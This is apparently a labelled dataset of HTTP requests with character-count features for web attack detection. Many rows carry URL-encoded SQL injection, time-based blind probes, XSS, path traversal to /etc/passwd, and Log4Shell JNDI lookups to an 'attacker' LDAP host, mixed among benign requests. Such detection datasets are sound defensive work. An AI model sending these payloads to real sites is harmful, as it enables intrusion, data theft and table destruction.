method,path,body,single_q,double_q,dashes,braces,spaces,badwords
GET,/news/trending,,0,0,0,0,0,0
POST,/dashboard/overview,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/downloads/app,,0,0,0,0,0,0
GET,/store,,0,0,0,0,0,0
POST,/support?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/api/v3/notifications,,0,0,0,0,0,0
POST,/languages/english,id=55,0,0,0,0,0,0
POST,/user/wishlist,,0,0,0,0,0,0
GET,/search?cat=electronics,,0,0,0,0,0,0
POST,/blog/archive/2023,,0,0,0,0,0,0
POST,/api/v3/notifications,,0,0,0,0,0,0
POST,/search?page=2,id=55,0,0,0,0,0,0
GET,/blog/post3,,0,0,0,0,0,0
POST,/faq?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/library/books,,0,0,0,0,0,0
GET,/products/new,,0,0,0,0,0,0
GET,/news/trending,,0,0,0,0,0,0
GET,/api/v1/orders,,0,0,0,0,0,0
GET,/playlists?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,,0,0,0,0,0,1
GET,/api/v1/products,,0,0,0,0,0,0
POST,/index.php,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/help/how-to-order,uemail=test@example.com,0,0,0,0,0,0
GET,/downloads/pdf?id=1,,0,0,0,0,0,0
POST,/store/apply-coupon?code=NEW50?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
GET,/playlists/trending?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/projects/list,,0,0,0,0,0,0
POST,/docs,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/downloads/pdf?id=1,,0,0,0,0,0,0
GET,/category/electronics,,0,0,0,0,0,0
POST,/languages/hindi,comment=Nice+product,0,0,0,0,1,0
GET,/news/trending?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/settings/security?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/blog/post3?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
GET,/gallery/photos,,0,0,0,0,0,0
POST,/assets/css/main.css,comment=Nice+product,0,0,0,0,1,0
POST,/gallery,id=55,0,0,0,0,0,0
POST,/news/local?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,4,0,0,2,0,6
GET,/static/theme.css?q=admin%27+--,,1,0,1,0,1,0
POST,/support/ticket,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/events/past,uname=test&pass=test,0,0,0,0,0,0
GET,/user/notifications,,0,0,0,0,0,0
GET,/admin/settings,,0,0,0,0,0,0
POST,/support?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/blog,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/billing/history,product=123&type=info,0,0,0,0,0,0
POST,/auth/register,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/api/v3/notifications?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/api/v2/checkout,uemail=test@example.com,0,0,0,0,0,0
POST,/admin/dashboard?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/university/courses,,0,0,0,0,0,0
GET,/search?page=3?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
POST,/api/v2/orders,id=55,0,0,0,0,0,0
GET,/checkout/payment?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
GET,/services.php,,0,0,0,0,0,0
GET,/page/4?q=admin%27+--,,1,0,1,0,1,0
POST,/books/read?id=100,uname=test&pass=test,0,0,0,0,0,0
GET,/reviews/post?id=29,,0,0,0,0,0,0
GET,/shop?q=sleep%285%29,,0,0,0,1,0,2
POST,/careers/job?id=25,uemail=test@example.com,0,0,0,0,0,0
POST,/page/1?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/forum/post?id=3,comment=Nice+product,0,0,0,0,1,0
GET,/checkout/address,,0,0,0,0,0,0
GET,/user/profile?id=1,,0,0,0,0,0,0
GET,/news,,0,0,0,0,0,0
POST,/projects/list,uname=test&pass=test,0,0,0,0,0,0
POST,/page/2?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/auth/logout,,0,0,0,0,0,0
POST,/blog/category/lifestyle,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/contact.html?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/account/history?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/orders,uemail=test@example.com,0,0,0,0,0,0
POST,/blog/post1,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/notifications/settings,,0,0,0,0,0,0
GET,/user/cart/add?id=45?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/books/read?id=100?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/languages,,0,0,0,0,0,0
POST,/page/1,id=55,0,0,0,0,0,0
GET,/offers/today,,0,0,0,0,0,0
POST,/search?page=1?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/products/reviews?id=10,comment=Nice+product,0,0,0,0,1,0
POST,/downloads/manual?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/dashboard/stats?q=sleep%285%29,,0,0,0,1,0,2
GET,/api/v1/users?page=2?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
POST,/news/latest,,0,0,0,0,0,0
GET,/reviews/post?id=29,,0,0,0,0,0,0
GET,/products/related?id=10,,0,0,0,0,0,0
GET,/api/v1/users,,0,0,0,0,0,0
POST,/newsfeed?q=%27+OR+sleep%285%29%23,data=%27+OR+sleep%285%29%23,2,0,0,2,4,4
GET,/newsfeed/today,,0,0,0,0,0,0
GET,/partners/apply,,0,0,0,0,0,0
GET,/user/profile?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
POST,/user/profile?id=3,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/faq,,0,0,0,0,0,0
POST,/reviews,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/shop,id=55,0,0,0,0,0,0
GET,/travel/offers?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/languages,,0,0,0,0,0,0
POST,/playlists/mixes,comment=Nice+product,0,0,0,0,1,0
POST,/products/view?id=2,comment=Nice+product,0,0,0,0,1,0
GET,/store/cart,,0,0,0,0,0,0
GET,/forum/category/tech,,0,0,0,0,0,0
GET,/search?q=shoes,,0,0,0,0,0,0
GET,/inbox/read?id=7,,0,0,0,0,0,0
GET,/inbox,,0,0,0,0,0,0
POST,/notifications?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/store/phones,id=55,0,0,0,0,0,0
GET,/admin/reports?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/offers/today,,0,0,0,0,0,0
GET,/static/script.js?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,2
GET,/user/profile?id=1?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/sports/football?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/travel/hotels,,0,0,0,0,0,0
POST,/languages/hindi,uname=test&pass=test,0,0,0,0,0,0
POST,/sports/cricket,comment=Nice+product,0,0,0,0,1,0
GET,/services.php?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/offers/clearance?q=%27+OR+%271%27%3D%271,,4,0,0,0,2,0
GET,/products/filter?cat=women?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/api/v1/users?page=2?q=admin%27+--,,1,0,1,0,1,0
POST,/user/cart/add?id=45,uname=test&pass=test,0,0,0,0,0,0
GET,/notifications/settings,,0,0,0,0,0,0
POST,/music,,0,0,0,0,0,0
GET,/downloads,,0,0,0,0,0,0
POST,/user/wishlist?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
GET,/api/v1/orders,,0,0,0,0,0,0
GET,/university,,0,0,0,0,0,0
POST,/user/profile?id=3,uname=test&pass=test,0,0,0,0,0,0
GET,/appointments?q=admin%27+--,,1,0,1,0,1,0
GET,/settings/security,,0,0,0,0,0,0
GET,/help/how-to-order,,0,0,0,0,0,0
POST,/auth/register,uname=test&pass=test,0,0,0,0,0,0
POST,/settings/security,uemail=test@example.com,0,0,0,0,0,0
POST,/unsubscribe,product=123&type=info,0,0,0,0,0,0
POST,/products/reviews?id=10?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/blog/category/tech?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/tickets/open?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/admin/dashboard,,0,0,0,0,0,0
POST,/partners,,0,0,0,0,0,0
POST,/dashboard/overview,id=55,0,0,0,0,0,0
POST,/feedback/form,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/sports,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/projects,id=55,0,0,0,0,0,0
POST,/movies,comment=Nice+product,0,0,0,0,1,0
POST,/travel/offers,product=123&type=info,0,0,0,0,0,0
POST,/search?q=shoes,id=55,0,0,0,0,0,0
POST,/forum/category/tech,id=55,0,0,0,0,0,0
POST,/category/fashion,uemail=test@example.com,0,0,0,0,0,0
GET,/subscriptions,,0,0,0,0,0,1
POST,/news/local?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
GET,/forum/post?id=3,,0,0,0,0,0,0
GET,/blog,,0,0,0,0,0,0
POST,/category/fashion,,0,0,0,0,0,0
GET,/search?page=3,,0,0,0,0,0,0
GET,/languages,,0,0,0,0,0,0
POST,/blog/category/lifestyle,product=123&type=info,0,0,0,0,0,0
POST,/restaurants/nearby,comment=Nice+product,0,0,0,0,1,0
POST,/gallery/videos,comment=Nice+product,0,0,0,0,1,0
POST,/home.html?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/university/course?id=20,,0,0,0,0,0,0
POST,/offers/clearance,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/user/notifications?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/newsfeed,,0,0,0,0,0,0
POST,/auth/verify-email,comment=Nice+product,0,0,0,0,1,0
GET,/products/view?id=1,,0,0,0,0,0,0
GET,/products/filter?price=high?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/subscribe,,0,0,0,0,0,0
GET,/api/v2/login,,0,0,0,0,0,0
POST,/organization/team?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/analytics/sales?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/index.php,,0,0,0,0,0,0
GET,/auth/verify-email,,0,0,0,0,0,0
POST,/promo/summer?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/api/v1/users/2,,0,0,0,0,0,0
POST,/feedback/submit,comment=Nice+product,0,0,0,0,1,0
POST,/music/playlist?id=4?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
GET,/promo/summer,,0,0,0,0,0,0
POST,/api/v1/orders,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/search?cat=electronics?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
POST,/inbox,uname=test&pass=test,0,0,0,0,0,0
POST,/home.html?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/events/past,uemail=test@example.com,0,0,0,0,0,0
GET,/library/book?id=10,,0,0,0,0,0,0
GET,/user/profile?id=2,,0,0,0,0,0,0
POST,/locations/india?q=%27+UNION+SELECT+1%2C2%2C3+--,data=%27+UNION+SELECT+1%2C2%2C3+--,2,0,2,0,8,8
GET,/weather/city?name=Delhi,,0,0,0,0,0,0
POST,/stocks/company?id=TCS,comment=Nice+product,0,0,0,0,1,0
GET,/music/songs?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/shop/item?id=89,id=55,0,0,0,0,0,0
GET,/static/theme.css,,0,0,0,0,0,0
POST,/products/reviews?id=10?q=%22+OR+%221%22%3D%221,data=%22+OR+%221%22%3D%221,0,8,0,0,4,0
GET,/travel/hotels?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/unsubscribe,uname=test&pass=test,0,0,0,0,0,0
POST,/promo/winter,comment=Nice+product,0,0,0,0,1,0
GET,/crypto/market,,0,0,0,0,0,0
GET,/products/filter?cat=women,,0,0,0,0,0,0
POST,/offers/today,comment=Nice+product,0,0,0,0,1,0
POST,/auth/login,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/store/cart?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
POST,/assets/images/banner.jpg,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/music/playlist?id=4,,0,0,0,0,0,0
POST,/support/ticket,uname=test&pass=test,0,0,0,0,0,0
POST,/products/related?id=10,product=123&type=info,0,0,0,0,0,0
POST,/api/v3/notifications,id=55,0,0,0,0,0,0
POST,/settings/security?q=%22+AND+1%3D1+--,data=%22+AND+1%3D1+--,0,2,2,0,6,2
POST,/promo/summer?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/stocks/company?id=TCS?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/static/script.js?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,1
GET,/page/1?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/store,uemail=test@example.com,0,0,0,0,0,0
GET,/services.html?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
POST,/category/electronics,uemail=test@example.com,0,0,0,0,0,0
GET,/library/book?id=10,,0,0,0,0,0,0
POST,/billing/payment-methods,id=55,0,0,0,0,0,0
GET,/stocks,,0,0,0,0,0,0
POST,/docs/setup,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/api/v2/orders,comment=Nice+product,0,0,0,0,1,0
GET,/store/apply-coupon?code=NEW50,,0,0,0,0,0,0
GET,/user/profile?id=3?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/settings,,0,0,0,0,0,0
GET,/weather/week?q=%27+UNION+SELECT+1%2C2%2C3+--,,1,0,1,0,4,4
POST,/products.html,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/blog/post1,,0,0,0,0,0,0
POST,/events?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,data=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,0,0,0,2,0,6
POST,/page/4,uname=test&pass=test,0,0,0,0,0,0
GET,/settings/security,,0,0,0,0,0,0
POST,/api/v3/settings,id=55,0,0,0,0,0,0
GET,/api/v2/register,,0,0,0,0,0,0
GET,/api/v2/orders,,0,0,0,0,0,0
GET,/docs/introduction,,0,0,0,0,0,0
POST,/admin/settings,uemail=test@example.com,0,0,0,0,0,0
GET,/api/v2/register?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
GET,/api/v1/users,,0,0,0,0,0,0
POST,/playlists/trending,uname=test&pass=test,0,0,0,0,0,0
GET,/restaurants/nearby,,0,0,0,0,0,0
POST,/sports/football,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/help/faq,,0,0,0,0,0,0
GET,/travel/flights?q=%22+OR+%221%22%3D%221,,0,4,0,0,2,0
GET,/auth/register,,0,0,0,0,0,0
POST,/admin/logs,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/search?page=3,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/products/view?id=2?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
POST,/admin/dashboard,product=123&type=info,0,0,0,0,0,0
GET,/pricing.html,,0,0,0,0,0,0
GET,/news/latest,,0,0,0,0,0,0
GET,/library/book?id=10,,0,0,0,0,0,0
POST,/docs/introduction,uemail=test@example.com,0,0,0,0,0,0
GET,/api/v1/users?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,,3,0,1,0,4,2
POST,/restaurants?q=benchmark%281000000%2Cmd5%281%29%29,data=benchmark%281000000%2Cmd5%281%29%29,0,0,0,4,0,2
POST,/restaurants,uemail=test@example.com,0,0,0,0,0,0
POST,/?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
GET,/forum/post?id=3?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,2,0,0,1,0,3
POST,/books/read?id=100,comment=Nice+product,0,0,0,0,1,0
POST,/account/downloads?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/products?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
GET,/privacy-policy,,0,0,0,0,0,0
POST,/shop/categories,uname=test&pass=test,0,0,0,0,0,0
GET,/support/ticket,,0,0,0,0,0,0
GET,/sports,,0,0,0,0,0,0
POST,/user/profile?id=1,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/organization/about?q=%253Cscript%253Ealert%28%29,data=%253Cscript%253Ealert%28%29,0,0,0,2,0,4
POST,/playlists/trending?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/movies,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/blog/archive/2023,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/contact.php?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
GET,/api/v2/auth,,0,0,0,0,0,0
GET,/user/profile?id=3,,0,0,0,0,0,0
GET,/blog/post2,,0,0,0,0,0,0
POST,/settings,uemail=test@example.com,0,0,0,0,0,0
GET,/projects/view?id=8?q=admin%27+--,,1,0,1,0,1,0
GET,/api/v2/auth,,0,0,0,0,0,0
GET,/forum/post?id=2,,0,0,0,0,0,0
GET,/reviews,,0,0,0,0,0,0
POST,/feedback/form,uemail=test@example.com,0,0,0,0,0,0
GET,/careers,,0,0,0,0,0,0
POST,/orders/detail?id=100?q=%27%3B+DROP+TABLE+users%3B+--,data=%27%3B+DROP+TABLE+users%3B+--,2,0,2,0,8,4
GET,/appointments/book,,0,0,0,0,0,0
POST,/organization/about,,0,0,0,0,0,0
GET,/support/ticket,,0,0,0,0,0,0
POST,/appointments/book?q=%27+AND+1%3D1+--,data=%27+AND+1%3D1+--,2,0,2,0,6,2
GET,/static/main.js,,0,0,0,0,0,0
GET,/newsfeed/today,,0,0,0,0,0,0
POST,/analytics/sales,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/user/wishlist/add?id=98,,0,0,0,0,0,0
GET,/api/v1/users?page=2,,0,0,0,0,0,0
GET,/locations/europe,,0,0,0,0,0,0
GET,/careers/job?id=25?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/dashboard,,0,0,0,0,0,0
POST,/products/view?id=2?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/search?q=laptops,uname=test&pass=test,0,0,0,0,0,0
GET,/blog/archive/2023?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,,0,0,0,1,0,3
GET,/user/cart,,0,0,0,0,0,0
POST,/forum/post?id=3,,0,0,0,0,0,0
GET,/account/security,,0,0,0,0,0,0
POST,/products/list,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
POST,/user/orders?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
GET,/api/v3/dashboard,,0,0,0,0,0,0
GET,/subscriptions/manage,,0,0,0,0,0,1
GET,/products?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
GET,/api/v1/users,,0,0,0,0,0,0
GET,/help/how-to-order,,0,0,0,0,0,0
GET,/store/laptops?q=sleep%285%29,,0,0,0,1,0,2
GET,/restaurants?q=%22+AND+1%3D1+--,,0,1,1,0,3,1
POST,/api/v3/settings?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
POST,/checkout/address,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/promo/summer,,0,0,0,0,0,0
GET,/appointments/book,,0,0,0,0,0,0
POST,/music,uname=test&pass=test,0,0,0,0,0,0
GET,/user/settings,,0,0,0,0,0,0
GET,/books,,0,0,0,0,0,0
POST,/shop/categories,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/offers/today,,0,0,0,0,0,0
GET,/store/apply-coupon?code=NEW50,,0,0,0,0,0,0
POST,/contact.php?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/news/trending,product=123&type=info,0,0,0,0,0,0
POST,/crypto/market,,0,0,0,0,0,0
POST,/books,product=123&type=info,0,0,0,0,0,0
POST,/blog/post1,id=55,0,0,0,0,0,0
GET,/notifications/settings?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
GET,/travel/offers,,0,0,0,0,0,0
POST,/forum/post?id=3,uname=test&pass=test,0,0,0,0,0,0
POST,/dashboard/stats,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/gallery,,0,0,0,0,0,0
GET,/blog/category/tech,,0,0,0,0,0,0
POST,/api/v1/users,uemail=test@example.com,0,0,0,0,0,0
GET,/services.html?q=admin%27+--,,1,0,1,0,1,0
GET,/feedback,,0,0,0,0,0,0
GET,/promo/summer,,0,0,0,0,0,0
POST,/shop/item?id=89,searchFor=book&goButton=go,0,0,0,0,0,0
POST,/restaurants/view?id=23,uname=test&pass=test,0,0,0,0,0,0
GET,/blog/category/tech,,0,0,0,0,0,0
POST,/stocks,product=123&type=info,0,0,0,0,0,0
GET,/account?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,,0,0,0,1,2,1
POST,/pricing.html,uname=test&pass=test,0,0,0,0,0,0
GET,/shop/item?id=89,,0,0,0,0,0,0
POST,/orders/detail?id=100,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/api/v1/users/2,,0,0,0,0,0,0
GET,/user/notifications,,0,0,0,0,0,0
POST,/events,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/api/v2/login,,0,0,0,0,0,0
POST,/tickets?q=1%3B+DROP+TABLE+users%3B,data=1%3B+DROP+TABLE+users%3B,0,0,0,0,6,4
POST,/help/how-to-order?q=%27+OR+%271%27%3D%271,data=%27+OR+%271%27%3D%271,8,0,0,0,4,0
GET,/settings/profile?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
POST,/appointments,uaddress=21+street&update=update,0,0,0,0,1,4
POST,/reviews/post?id=29,comment=Nice+product,0,0,0,0,1,0
GET,/billing/invoice?id=55,,0,0,0,0,0,0
POST,/settings/profile,id=55,0,0,0,0,0,0
GET,/products?q=..%2Fetc%2Fpasswd,,0,0,0,0,0,1
GET,/api/v2/register,,0,0,0,0,0,0
POST,/restaurants/nearby?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,data=%24%7Bjndi%3Aldap%3A%2F%2Fattacker%7D,0,0,0,0,0,0
POST,/admin/users?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/partners,uaddress=21+street&update=update,0,0,0,0,1,4
GET,/sports?q=%27+OR+sleep%285%29%23,,1,0,0,1,2,2
GET,/blog/post3,,0,0,0,0,0,0
POST,/weather/city?name=Delhi?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,data=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,0,0,0,2,4,2
POST,/weather/week,product=123&type=info,0,0,0,0,0,0
POST,/products/top?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
POST,/forum/post?id=2,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/events/past,,0,0,0,0,0,0
GET,/blog/category/lifestyle,,0,0,0,0,0,0
POST,/store/checkout,uemail=test@example.com,0,0,0,0,0,0
POST,/playlists/trending,id=55,0,0,0,0,0,0
POST,/orders,comment=Nice+product,0,0,0,0,1,0
GET,/api/v1/users?page=2,,0,0,0,0,0,0
POST,/admin/logs,product=123&type=info,0,0,0,0,0,0
POST,/inbox?q=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,data=..%2F..%2F..%2F..%2Fwindows%2Fsystem32,0,0,0,0,0,2
GET,/stocks/market?q=%27+AND+1%3D1+--,,1,0,1,0,3,1
GET,/billing,,0,0,0,0,0,0
GET,/products/reviews?id=10,,0,0,0,0,0,0
GET,/services.html?q=1%3B+DROP+TABLE+users%3B,,0,0,0,0,3,2
POST,/university,searchFor=book&goButton=go,0,0,0,0,0,0
GET,/forum/post?id=1,,0,0,0,0,0,0
GET,/settings/billing,,0,0,0,0,0,0
POST,/downloads/manual,uemail=test@example.com,0,0,0,0,0,0
GET,/page/2,,0,0,0,0,0,0
GET,/movies/details?id=9,,0,0,0,0,0,0
GET,/account/security?q=benchmark%281000000%2Cmd5%281%29%29,,0,0,0,2,0,1
POST,/downloads,uname=test&pass=test,0,0,0,0,0,0
POST,/blog/post3?q=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,data=%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--,6,0,2,0,8,4
POST,/weather/today,product=123&type=info,0,0,0,0,0,0
POST,/admin/logs?q=sleep%285%29,data=sleep%285%29,0,0,0,2,0,4
POST,/admin/reports?q=..%2Fetc%2Fpasswd,data=..%2Fetc%2Fpasswd,0,0,0,0,0,2
POST,/languages/english,uname=test&pass=test,0,0,0,0,0,0
GET,/reviews,,0,0,0,0,0,0
GET,/shop/item?id=89,,0,0,0,0,0,0
POST,/settings/security,uemail=test@example.com,0,0,0,0,0,0
GET,/search?cat=fashion,,0,0,0,0,0,0
